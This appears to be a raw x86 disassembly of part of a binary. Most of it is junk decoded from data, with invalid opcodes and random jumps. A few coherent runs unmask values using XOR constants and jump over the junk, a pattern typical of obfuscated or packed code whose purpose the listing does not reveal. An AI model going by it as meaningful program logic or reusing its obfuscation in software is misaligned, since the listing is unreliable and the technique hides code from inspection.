  40d654:	icebp  
  40d655:	in     eax,dx
  40d656:	rol    BYTE PTR [edi-0x2f],1
  40d659:	mov    bl,0x6c
  40d65b:	je     0x40d672
  40d65d:	mov    edx,0x65763b7b
  40d662:	hlt    
  40d663:	xchg   edi,eax
  40d664:	push   esi
  40d665:	inc    ebx
  40d666:	inc    esp
  40d667:	push   esi
  40d668:	sbb    BYTE PTR [ecx+0x341c6ce5],ch
  40d66e:	loop   0x40d61c
  40d670:	mov    WORD PTR [ebx],?
  40d672:	pop    ds
  40d673:	addr16 mov edx,0x4eb2527e
  40d679:	mov    DWORD PTR [ebp+0x23],esp
  40d67c:	xchg   ebx,eax
  40d67d:	xor    al,0x3
  40d67f:	ins    DWORD PTR es:[edi],dx
  40d680:	out    dx,al
  40d681:	lea    edx,[ebx]
  40d683:	mov    dh,0xf1
  40d685:	inc    edx
  40d686:	adc    eax,0x257f8f4b
  40d68b:	mov    eax,0x28c533af
  40d690:	ins    DWORD PTR es:[edi],dx
  40d691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d692:	retf   
  40d693:	or     DWORD PTR [esi+0x2328acde],0x6
  40d69a:	stos   DWORD PTR es:[edi],eax
  40d69b:	dec    ecx
  40d69c:	(bad)  
  40d69d:	pop    ss
  40d69e:	adc    dl,BYTE PTR [ecx+0x64]
  40d6a1:	jae    0x40d709
  40d6a3:	ret    0x9384
  40d6a6:	stos   DWORD PTR es:[edi],eax
  40d6a7:	or     esp,DWORD PTR [ecx]
  40d6a9:	jge    0x40d65a
  40d6ab:	push   eax
  40d6ac:	xchg   ebp,eax
  40d6ad:	stos   BYTE PTR es:[edi],al
  40d6ae:	hlt    
  40d6af:	out    dx,eax
  40d6b0:	inc    eax
  40d6b1:	push   ds
  40d6b2:	push   ss
  40d6b3:	dec    edx
  40d6b4:	stos   BYTE PTR es:[edi],al
  40d6b5:	outs   dx,BYTE PTR ds:[esi]
  40d6b6:	into   
  40d6b7:	adc    al,0x75
  40d6b9:	cmp    eax,0x705ddbce
  40d6be:	mov    cl,0xf9
  40d6c0:	call   0x34c659c
  40d6c5:	pop    edi
  40d6c6:	retf   
  40d6c7:	arpl   WORD PTR ds:0x48cb8dcf,bp
  40d6cd:	jne    0x40d67e
  40d6cf:	ja     0x40d690
  40d6d1:	or     al,0xe9
  40d6d3:	in     eax,0xff
  40d6d5:	jmp    0x8e28:0x4d86062
  40d6dc:	clc    
  40d6dd:	ins    BYTE PTR es:[edi],dx
  40d6de:	jecxz  0x40d673
  40d6e0:	outs   dx,BYTE PTR ds:[esi]
  40d6e1:	dec    ebp
  40d6e2:	xchg   edi,eax
  40d6e3:	and    al,0xd2
  40d6e5:	scas   eax,DWORD PTR es:[edi]
  40d6e6:	adc    BYTE PTR cs:[ebx],0x45
  40d6ea:	fdiv   DWORD PTR [eax+eax*1+0x458ba156]
  40d6f1:	cld    
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [ecx-0xb],ds
  40d728:	ss dec esp
  40d72a:	add    eax,0x227e7e8d
  40d72f:	jg     0x40d7af
  40d731:	jle    0x40d77b
  40d733:	repnz and ch,bh
  40d736:	ds daa 
  40d738:	sub    ch,dh
  40d73a:	xchg   ebp,eax
  40d73b:	fs push 0x780bb28b
  40d741:	or     al,0xc5
  40d743:	repnz shl DWORD PTR [edx],0x7d
  40d747:	sub    esi,ecx
  40d749:	dec    ebp
  40d74a:	xor    edx,DWORD PTR [ecx-0x72]
  40d74d:	add    al,dh
  40d74f:	pop    esi
  40d750:	inc    esi
  40d751:	xchg   esp,eax
  40d752:	fnstcw WORD PTR [ecx+0x1]
  40d755:	mov    al,BYTE PTR [eax+0x52]
  40d758:	lea    ebx,[eax+0x3b]
  40d75b:	stos   DWORD PTR es:[edi],eax
  40d75c:	clc    
  40d75d:	mov    ecx,0xcfdd3cd6
  40d762:	callw  0x5d31
  40d766:	test   al,0x25
  40d768:	clc    
  40d769:	adc    al,0x30
  40d76b:	xchg   ecx,eax
  40d76c:	adc    al,0xe2
  40d76e:	sti    
  40d76f:	stos   BYTE PTR es:[edi],al
  40d770:	imul   edx,DWORD PTR [eax-0x5036751f],0x21b7f9ca
  40d77a:	mov    ebx,0xb4165b4f
  40d77f:	jl     0x40d764
  40d781:	pop    ecx
  40d782:	(bad)  
  40d785:	sbb    al,0x5a
  40d787:	mov    esp,0x1085230b
  40d78c:	adc    dl,ch
  40d78e:	mov    ch,0x6d
  40d790:	xchg   esi,eax
  40d791:	inc    eax
  40d792:	addr16 push edi
  40d794:	sti    
  40d795:	inc    esp
  40d796:	and    eax,0x5da9cc1b
  40d79b:	stc    
  40d79c:	fcomp  QWORD PTR [esi+0x200af857]
  40d7a2:	fidivr WORD PTR [ebp+0x73]
  40d7a5:	rcl    dh,cl
  40d7a7:	test   DWORD PTR [esi+0x30],edi
  40d7aa:	add    BYTE PTR [esi-0x1a],ah
  40d7ad:	lea    esi,[ecx]
  40d7af:	dec    BYTE PTR [ebx-0x3b]
  40d7b2:	pop    ecx
  40d7b3:	ja     0x40d7b4
  40d7b5:	imul   esp,ebp,0xc85405cd
  40d7bb:	fs mov dh,0xcd
  40d7be:	adc    BYTE PTR [edi-0x79b88a47],0x71
  40d7c5:	ret    0x73a3
  40d7c8:	rcl    BYTE PTR [ebx+0x79],1
  40d7cb:	out    dx,al
  40d7cc:	test   al,0x83
  40d7ce:	test   BYTE PTR [ecx],0xe5
  40d7d1:	in     eax,dx
  40d7d2:	adc    edx,0x1878f741
  40d7d8:	xor    DWORD PTR [edi],edx
  40d7da:	jge    0x40d833
  40d7dc:	or     ch,al
  40d7de:	and    eax,0x3f241c0f
  40d7e3:	xchg   ebx,eax
  40d7e4:	test   edx,0xcf96c860
  40d7ea:	fcmovu st,st(4)
  40d7ec:	adc    BYTE PTR [esi-0x6b],dl
  40d7ef:	scas   eax,DWORD PTR es:[edi]
  40d7f0:	jnp    0x40d84b
  40d7f2:	lock (bad) 
  40d7f5:	adc    BYTE PTR [ecx-0x7e902861],0xbe
  40d7fc:	neg    BYTE PTR [esi-0x6f]
  40d7ff:	pop    esp
  40d800:	retf   0xbb7a
  40d803:	gs inc edx
  40d805:	outs   dx,BYTE PTR ds:[esi]
  40d806:	(bad)  
  40d807:	fcomp  QWORD PTR [ebx]
  40d809:	cli    
  40d80a:	fnstenv [ebp+0x77df1fc0]
  40d810:	js     0x40d7fe
  40d812:	clc    
  40d813:	sub    eax,0x63411212
  40d818:	int    0xc0
  40d81a:	sub    DWORD PTR [ebp-0x5a2dca9d],esi
  40d820:	hlt    
  40d821:	call   0x81f0ecfe
  40d826:	xor    al,0x2a
  40d828:	mov    ds:0x2e34f355,al
  40d82d:	in     eax,0x76
  40d82f:	dec    eax
  40d830:	dec    eax
  40d831:	mov    ebp,0x12e16993
  40d836:	mov    ds:0x83b8efd1,eax
  40d83b:	add    eax,0x87ad1e6e
  40d840:	dec    esp
  40d841:	or     DWORD PTR [esi+0x3e],0x2e
  40d845:	xchg   ecx,eax
  40d846:	jno    0x40d894
  40d848:	frndint 
  40d84a:	fst    QWORD PTR [edx+0x6000a4fc]
  40d850:	push   cs
  40d851:	mov    ds:0xf68f8b31,eax
  40d856:	je     0x40d8cd
  40d858:	ja     0x40d831
  40d85a:	pop    esi
  40d85b:	test   BYTE PTR [ebx],cl
  40d85d:	pop    es
  40d85e:	pop    ecx
  40d85f:	push   0x5
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	inc    ebp
  40d879:	push   ebx
  40d87a:	push   es
  40d87b:	and    ebp,DWORD PTR [ecx]
  40d87d:	mov    bh,BYTE PTR [esi+0x7e]
  40d880:	and    bh,BYTE PTR [edi+0x7e]
  40d883:	jle    0x40d835
  40d885:	dec    eax
  40d886:	mov    ds:0x9900fd2b,al
  40d88b:	enter  0xd192,0x3b
  40d88f:	pushf  
  40d890:	cli    
  40d891:	ins    DWORD PTR es:[edi],dx
  40d892:	pop    DWORD PTR [esp+esi*4]
  40d895:	iret   
  40d896:	sub    edx,esp
  40d898:	jmp    0x40d83b
  40d89a:	and    bh,bh
  40d89c:	jmp    0x74f2c9ae
  40d8a1:	add    DWORD PTR [edi+0x6a8e56d3],edi
  40d8a7:	inc    ecx
  40d8a8:	imul   ebx,DWORD PTR [ecx],0x70b54df1
  40d8ae:	push   0xdaf2d4b9
  40d8b3:	jl     0x40d8a0
  40d8b5:	daa    
  40d8b6:	dec    esi
  40d8b7:	fistp  WORD PTR [ebp+0x630fee6a]
  40d8bd:	arpl   sp,ax
  40d8bf:	mov    bh,BYTE PTR [edi-0x3d]
  40d8c2:	fisubr DWORD PTR [edx-0x12ddb605]
  40d8c8:	push   eax
  40d8c9:	ja     0x40d944
  40d8cb:	das    
  40d8cc:	aad    0x40
  40d8ce:	out    0xa2,eax
  40d8d0:	ret    0xdc34
  40d8d3:	sbb    eax,0x739bdd2f
  40d8d8:	sub    al,0x3b
  40d8da:	lods   al,BYTE PTR ds:[esi]
  40d8db:	mov    ds:0xc8fa6224,eax
  40d8e0:	dec    edx
  40d8e1:	scas   eax,DWORD PTR es:[edi]
  40d8e2:	sub    al,0xb7
  40d8e4:	nop
  40d8e5:	inc    esi
  40d8e6:	and    DWORD PTR [eax-0x5f],ebp
  40d8e9:	aad    0x1a
  40d8eb:	enter  0x2ee,0xf3
  40d8ef:	mov    al,0x7c
  40d8f1:	ds cmp BYTE PTR ds:[edi],al
  40d8f5:	push   edx
  40d8f6:	loopne 0x40d8b3
  40d8f8:	mov    al,0x68
  40d8fa:	inc    esp
  40d8fb:	call   0x6e224c3
  40d900:	push   ebp
  40d901:	ja     0x40d979
  40d903:	in     eax,0x72
  40d905:	push   ebx
  40d906:	jnp    0x40d8f2
  40d908:	addr16 push 0xb86723e9
  40d90e:	shr    bl,cl
  40d910:	pusha  
  40d911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d912:	mov    fs,WORD PTR [edx+0x3d]
  40d915:	add    cl,al
  40d917:	sbb    cl,ah
  40d919:	pop    ebp
  40d91a:	and    esi,edi
  40d91c:	push   es
  40d91d:	pop    edi
  40d91e:	mov    ds:0x339687d6,eax
  40d923:	mov    dl,0x84
  40d925:	fnstenv [ecx]
  40d927:	mov    cl,0xb1
  40d929:	inc    esi
  40d92a:	mov    WORD PTR ds:0xfb9e5879,cs
  40d930:	pop    esi
  40d931:	rcl    DWORD PTR [ecx+0x6b387084],cl
  40d937:	cmp    DWORD PTR [esi-0x1b],edx
  40d93a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d93b:	cli    
  40d93c:	dec    esi
  40d93d:	sub    al,0xa3
  40d93f:	lea    ebx,[ecx+0x43c3b7d0]
  40d945:	mov    al,0x73
  40d947:	sbb    al,0xe5
  40d949:	jno    0x40d954
  40d94b:	mov    ds:0x862346c6,al
  40d950:	fstp   st(5)
  40d952:	fidivr WORD PTR [edi+edx*8+0x17c9c736]
  40d959:	or     eax,DWORD PTR [esi-0x345abe8a]
  40d95f:	xchg   BYTE PTR gs:[esi-0xa],dh
  40d963:	(bad)  
  40d964:	sbb    DWORD PTR [edi],esi
  40d966:	push   edx
  40d967:	or     esi,DWORD PTR [eax-0x46]
  40d96a:	stos   BYTE PTR es:[edi],al
  40d96b:	mov    ?,WORD PTR [ecx-0x13]
  40d96e:	adc    BYTE PTR [ecx-0x14ed927c],ch
  40d974:	and    ebp,ebp
  40d976:	pushf  
  40d977:	cmp    al,0x74
  40d979:	cmp    ebp,DWORD PTR [ecx-0x61]
  40d97c:	hlt    
  40d97d:	and    DWORD PTR [ebp-0x5f],ebp
  40d980:	fmul   QWORD PTR [edx]
  40d982:	jl     0x40d9f4
  40d984:	outs   dx,DWORD PTR ds:[esi]
  40d985:	ffree  st(1)
  40d987:	aad    0xc8
  40d989:	sub    ch,BYTE PTR [esi]
  40d98b:	rol    DWORD PTR [edi],cl
  40d98d:	ins    DWORD PTR es:[edi],dx
  40d98e:	inc    edi
  40d98f:	or     esi,DWORD PTR [esi-0x59735553]
  40d995:	push   ss
  40d996:	call   0x98f6f6e5
  40d99b:	cmc    
  40d99c:	or     esp,DWORD PTR [edi-0x4c]
  40d99f:	iret   
  40d9a0:	das    
  40d9a1:	push   edi
  40d9a2:	retf   0x897f
  40d9a5:	mov    ecx,0xd6e5da96
  40d9aa:	fisttp WORD PTR [edx+0x244fa90b]
  40d9b0:	xchg   ebx,ecx
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	and    BYTE PTR [esi-0x2c],0x19
  40d9c7:	fisttp QWORD PTR [ebx+0x7f227e7e]
  40d9cd:	jle    0x40da4d
  40d9cf:	test   DWORD PTR [ecx-0x46],ecx
  40d9d2:	jcxz   0x40d9a3
  40d9d5:	sub    DWORD PTR cs:[ecx],esp
  40d9d8:	inc    edx
  40d9d9:	test   al,0x51
  40d9db:	mov    esp,ecx
  40d9dd:	push   cs
  40d9de:	aad    0xa4
  40d9e0:	or     BYTE PTR [eax-0x2f0fc21c],dl
  40d9e6:	xor    esi,ecx
  40d9e8:	shl    BYTE PTR [edi],1
  40d9ea:	and    al,0xa5
  40d9ec:	xchg   DWORD PTR [edi-0x4e],esp
  40d9ef:	mov    DWORD PTR [esi+0x6b5fbed4],eax
  40d9f5:	mov    esp,0x19d984df
  40d9fa:	(bad)  
  40d9fb:	test   al,0x3
  40d9fd:	scas   al,BYTE PTR es:[edi]
  40d9fe:	call   0xe60e8f71
  40da03:	(bad)  
  40da05:	dec    ecx
  40da06:	pop    esp
  40da07:	pop    eax
  40da08:	aas    
  40da09:	xor    al,0x8f
  40da0b:	xchg   esi,eax
  40da0c:	lds    ecx,FWORD PTR [ebx+0x61397071]
  40da12:	lock sbb esi,DWORD PTR [esp+eax*8]
  40da16:	pusha  
  40da17:	cli    
  40da18:	pop    ebx
  40da19:	mov    ecx,0x104c55f1
  40da1e:	into   
  40da1f:	mov    dl,0xbd
  40da21:	mov    bh,0x7b
  40da23:	out    dx,al
  40da24:	sti    
  40da25:	ficom  WORD PTR [eax+0x32]
  40da28:	mov    ch,0xf0
  40da2a:	and    eax,0x11c2513e
  40da2f:	or     DWORD PTR [edi],ebp
  40da31:	dec    ebx
  40da32:	dec    esi
  40da33:	dec    esi
  40da34:	push   ss
  40da35:	dec    ecx
  40da36:	lock test al,0x2d
  40da39:	xchg   esi,eax
  40da3a:	inc    esp
  40da3b:	mov    ch,0x99
  40da3d:	cmp    al,0xb9
  40da3f:	retf   
  40da40:	out    0x23,eax
  40da42:	mov    ds:0x7fcfff6b,al
  40da47:	enter  0xedd6,0x58
  40da4b:	inc    esi
  40da4c:	lods   eax,DWORD PTR ds:[esi]
  40da4d:	std    
  40da4e:	dec    ebx
  40da4f:	push   es
  40da50:	or     ebx,DWORD PTR [eax-0x33]
  40da53:	lds    esi,FWORD PTR [eax-0x64]
  40da56:	sub    ah,BYTE PTR [edi-0x426f1675]
  40da5c:	cmp    dh,BYTE PTR [ebx+0x76]
  40da5f:	cmp    edi,esp
  40da61:	and    ebx,edi
  40da63:	inc    ebp
  40da64:	adc    al,BYTE PTR [eax+0x29241923]
  40da6a:	or     BYTE PTR [ebp-0x34],bl
  40da6d:	mov    edi,0x434e6cee
  40da72:	xor    al,0x58
  40da74:	xchg   ebp,eax
  40da75:	fdiv   st,st(2)
  40da77:	imul   esi,DWORD PTR [eax+0x54],0xffffffdc
  40da7b:	xor    eax,0xc8210a25
  40da80:	dec    esp
  40da81:	int3   
  40da82:	imul   edi,DWORD PTR [esi+0x29],0x47
  40da86:	add    ebp,DWORD PTR [ecx+0xdb70eb1]
  40da8c:	dec    esp
  40da8d:	(bad)  
  40da8e:	sub    al,0x8c
  40da90:	int    0x94
  40da92:	icebp  
  40da93:	sar    BYTE PTR [eax],1
  40da95:	xor    edi,0x6d
  40da98:	adc    esi,esp
  40da9a:	int3   
  40da9b:	aas    
  40da9c:	mov    ebx,0x59d9a8bc
  40daa1:	addr16 mov al,ds:0x43f1
  40daa5:	jnp    0x40daaf
  40daa7:	loopne 0x40db13
  40daa9:	in     eax,0xeb
  40daab:	pushf  
  40daac:	inc    ecx
  40daad:	jmp    0x40db26
  40daaf:	push   0xe2b53b45
  40dab4:	loop   0x40da7e
  40dab6:	jbe    0x40db0a
  40dab8:	gs xchg ebx,eax
  40daba:	lods   al,BYTE PTR ds:[esi]
  40dabb:	xlat   BYTE PTR ds:[ebx]
  40dabc:	leave  
  40dabd:	scas   al,BYTE PTR es:[edi]
  40dabe:	push   0xffffffeb
  40dac0:	test   BYTE PTR [ebx],0xe5
  40dac3:	mov    eax,ds:0x30542bee
  40dac8:	sub    cl,BYTE PTR [esi-0x72]
  40dacb:	ficom  DWORD PTR [ebx-0x2f39b3ce]
  40dad1:	lods   al,BYTE PTR ds:[esi]
  40dad2:	loop   0x40da60
  40dad4:	xchg   ecx,eax
  40dad5:	add    DWORD PTR [ebx+0x1994e79],0x6
  40dadc:	mov    ds:0x42a7bdb8,eax
  40dae1:	adc    DWORD PTR [ebp+0x5b60bd41],0x73a8b4d1
  40daeb:	ret    
  40daec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daed:	mov    ds:0x2b8aea89,eax
  40daf2:	and    ch,BYTE PTR [esi]
  40daf4:	xchg   DWORD PTR [eax-0x19],ebx
  40daf7:	cwde   
  40daf8:	arpl   WORD PTR [eax+0x458b4958],sp
  40dafe:	in     al,0xf
  40db00:	scas   eax,DWORD PTR es:[edi]
  40db01:	shr    DWORD PTR [ebx],0xe0
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0xc4b6fdf0
  40db32:	mov    bh,0xa7
  40db35:	or     DWORD PTR [eax+0x7f227e7e],0x71637e7e
  40db3f:	inc    ebp
  40db40:	dec    edi
  40db41:	adc    al,0xad
  40db43:	outs   dx,BYTE PTR ds:[esi]
  40db44:	scas   eax,DWORD PTR es:[edi]
  40db45:	fidiv  WORD PTR es:[ecx+0x73f60d43]
  40db4c:	sub    ah,ch
  40db4e:	stos   BYTE PTR es:[edi],al
  40db4f:	push   esi
  40db50:	mov    ds:0x89e59cf7,al
  40db55:	mov    ebp,0x59de4cd4
  40db5a:	int3   
  40db5b:	mov    edx,es
  40db5d:	mov    ebp,0x34347f67
  40db62:	nop
  40db63:	sub    ch,BYTE PTR [esi-0x5d]
  40db66:	cld    
  40db67:	inc    esp
  40db68:	cmc    
  40db69:	shl    DWORD PTR [ecx*8-0x747cd726],0xfb
  40db71:	push   0xdfab369c
  40db76:	nop
  40db77:	push   ebp
  40db78:	enter  0x7d8,0xf0
  40db7c:	adc    al,0x46
  40db7e:	lods   al,BYTE PTR ds:[esi]
  40db80:	mov    ds:0x37129419,al
  40db85:	mov    ds:0x9fab46b2,eax
  40db8a:	mov    ch,0xe9
  40db8c:	sub    ecx,ebp
  40db8e:	push   edi
  40db8f:	test   DWORD PTR [ebp+0xa],ebx
  40db92:	retf   
  40db93:	add    al,0xbd
  40db95:	or     BYTE PTR [eax+ebp*8-0x24],dh
  40db99:	dec    edx
  40db9a:	ds int3 
  40db9c:	add    DWORD PTR [edi+0x60],0xffffffe5
  40dba0:	into   
  40dba1:	rcl    esi,1
  40dba3:	dec    edi
  40dba4:	push   cs
  40dba5:	std    
  40dba6:	push   ds
  40dba7:	popa   
  40dba8:	test   al,0x3
  40dbaa:	push   ds
  40dbab:	nop
  40dbac:	bswap  esp
  40dbae:	retf   
  40dbaf:	sbb    eax,0xe3b6577
  40dbb4:	ins    BYTE PTR es:[edi],dx
  40dbb5:	mov    bl,0x98
  40dbb7:	shl    DWORD PTR [esi],cl
  40dbb9:	outs   dx,DWORD PTR ds:[esi]
  40dbba:	mov    ebx,0x1d4a7fd4
  40dbbf:	pop    ebx
  40dbc1:	rcr    BYTE PTR [eax-0x338a52c1],cl
  40dbc7:	stos   BYTE PTR es:[edi],al
  40dbc8:	das    
  40dbc9:	ins    DWORD PTR es:[edi],dx
  40dbca:	jnp    0x40db53
  40dbcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbcd:	cmp    edi,edx
  40dbcf:	test   DWORD PTR [edx-0x3a],eax
  40dbd2:	xlat   BYTE PTR fs:[ebx]
  40dbd4:	cmp    al,0x69
  40dbd6:	sub    al,BYTE PTR [esi-0x4b1a5ed2]
  40dbdc:	fld    TBYTE PTR [esi-0x3b742e9a]
  40dbe2:	das    
  40dbe3:	dec    esi
  40dbe4:	xor    edi,DWORD PTR [edi-0x2f301f9b]
  40dbea:	or     bl,BYTE PTR [edi+ebp*8]
  40dbed:	shl    esp,0x2
  40dbf0:	mov    bl,0x42
  40dbf2:	mov    ebp,0x13df9c4a
  40dbf7:	jb     0x40dc3a
  40dbf9:	mov    bl,cl
  40dbfb:	adc    DWORD PTR [ebp+0x2f],edi
  40dbfe:	lods   al,BYTE PTR ds:[esi]
  40dbff:	cli    
  40dc00:	out    dx,al
  40dc01:	cdq    
  40dc02:	pop    es
  40dc03:	scas   al,BYTE PTR es:[edi]
  40dc04:	jg     0x40dc40
  40dc06:	mov    edx,DWORD PTR [ebx-0x37]
  40dc09:	popa   
  40dc0a:	pop    ss
  40dc0b:	add    ah,BYTE PTR [eax-0x2a]
  40dc0e:	sbb    DWORD PTR [ebp+edx*2-0x2f],ebx
  40dc12:	iret   
  40dc13:	aad    0x7a
  40dc15:	dec    edi
  40dc16:	ror    DWORD PTR [edx],1
  40dc18:	sar    BYTE PTR [eax+0x1f],1
  40dc1b:	push   0x30c7b6ce
  40dc20:	sub    bh,cl
  40dc22:	sbb    ebx,edi
  40dc24:	sub    al,0xdd
  40dc26:	push   ds
  40dc27:	inc    ecx
  40dc28:	push   0x3feab7d
  40dc2d:	mov    fs,WORD PTR [edi]
  40dc2f:	jmp    0x40dc21
  40dc31:	bnd jge 0x40dbf8
  40dc34:	or     esp,DWORD PTR [edx-0x22b3b2bd]
  40dc3a:	mov    ecx,0xaa296c04
  40dc3f:	mov    eax,ds:0xf8bdc25f
  40dc44:	push   cs
  40dc45:	inc    ecx
  40dc46:	sbb    ch,cl
  40dc48:	arpl   WORD PTR [ecx],bp
  40dc4a:	pop    ss
  40dc4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc4c:	scas   al,BYTE PTR es:[edi]
  40dc4d:	ror    BYTE PTR [ebx],0x26
  40dc50:	inc    edx
  40dc51:	mov    eax,0x9fc2a2f2
  40dc56:	or     eax,0xa0c40f36
  40dc5b:	mov    BYTE PTR [edi+0x30],dh
  40dc5e:	out    0xc3,eax
  40dc60:	shl    DWORD PTR [edx-0x3a],0xa8
  40dc64:	adc    edx,esi
  40dc66:	ret    
  40dc67:	cli    
  40dc68:	fild   DWORD PTR [ebx]
  40dc6a:	ret    0x558b
  40dc6d:	adc    al,0xf
  40dc6f:	scas   eax,DWORD PTR es:[edi]
  40dc70:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	dec    esp
  40dcdd:	jle    0x40dd13
  40dcdf:	and    dh,BYTE PTR [ebp+0x227e7e89]
  40dce5:	jg     0x40dd65
  40dce7:	jle    0x40dd41
  40dce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcea:	sbb    eax,0x8ad71d23
  40dcef:	jp     0x40dd48
  40dcf1:	cmp    DWORD PTR [edx],eax
  40dcf3:	lea    ebp,[ebx-0x53b5b495]
  40dcf9:	xor    al,0xd0
  40dcfb:	arpl   WORD PTR [eax],dx
  40dcfd:	(bad)  
  40dcfe:	neg    BYTE PTR [ebx+0x34d9c51]
  40dd04:	in     al,dx
  40dd05:	fwait
  40dd06:	lods   eax,DWORD PTR ss:[si]
  40dd09:	push   ecx
  40dd0a:	jg     0x40dd3e
  40dd0c:	loop   0x40dd2c
  40dd0e:	push   0x49
  40dd10:	sub    al,0x64
  40dd12:	(bad)  
  40dd13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd14:	stc    
  40dd15:	shl    esi,0x5c
  40dd18:	ins    BYTE PTR es:[edi],dx
  40dd19:	div    DWORD PTR [edx+0x60]
  40dd1c:	mov    ?,esi
  40dd1e:	int    0x7f
  40dd20:	sub    bl,bh
  40dd22:	loope  0x40dd45
  40dd24:	xor    eax,0x963452d6
  40dd29:	add    al,0xc4
  40dd2b:	test   DWORD PTR [esi+0x20cecd05],ebx
  40dd31:	popf   
  40dd32:	dec    esp
  40dd33:	scas   al,BYTE PTR es:[edi]
  40dd34:	add    ecx,DWORD PTR [eax]
  40dd36:	inc    ebx
  40dd37:	mov    al,0xf9
  40dd39:	xchg   edx,eax
  40dd3a:	mov    dl,0xe7
  40dd3c:	push   cs
  40dd3d:	cwde   
  40dd3e:	std    
  40dd3f:	sbb    al,0xe8
  40dd41:	mov    ah,0x12
  40dd43:	jle    0x40dce1
  40dd45:	mov    ebp,0xe0ab799d
  40dd4a:	jns    0x40dd79
  40dd4c:	in     al,dx
  40dd4d:	ds lahf 
  40dd4f:	adc    al,0x5b
  40dd51:	pop    DWORD PTR [ecx]
  40dd53:	ret    0x18e5
  40dd56:	dec    DWORD PTR [edi]
  40dd58:	xchg   ecx,eax
  40dd59:	mov    eax,0x28334f83
  40dd5e:	(bad)  
  40dd5f:	mov    ebx,DWORD PTR [edi+0x27]
  40dd62:	inc    ebx
  40dd63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd64:	push   es
  40dd65:	fbstp  TBYTE PTR [ebp+0x7e]
  40dd68:	xchg   esp,eax
  40dd69:	or     ebp,ecx
  40dd6b:	repnz push edx
  40dd6d:	jae    0x40dcfd
  40dd6f:	add    bh,BYTE PTR [eax]
  40dd71:	xchg   esi,eax
  40dd72:	inc    edi
  40dd73:	sbb    eax,0x7cc9064d
  40dd78:	dec    ecx
  40dd79:	cmp    BYTE PTR [ebp+0x26c823bf],cl
  40dd7f:	push   ebx
  40dd80:	rcl    BYTE PTR [edx+0x424bd584],0xd5
  40dd87:	ret    
  40dd88:	or     eax,0xd9be8721
  40dd8d:	and    eax,DWORD PTR [esi+eax*8]
  40dd90:	aaa    
  40dd91:	adc    DWORD PTR [eax+0x2876c5bb],ecx
  40dd97:	mov    ds:0x8d154080,eax
  40dd9c:	dec    ebp
  40dd9d:	subps  xmm2,XMMWORD PTR [esi+0x49]
  40dda1:	sar    BYTE PTR [ebp-0xd],cl
  40dda4:	les    ebp,FWORD PTR [ecx-0x6d329b2d]
  40ddaa:	mov    edx,0x6b6d5f0d
  40ddaf:	pop    es
  40ddb0:	lods   al,BYTE PTR ds:[esi]
  40ddb1:	jae    0x40de01
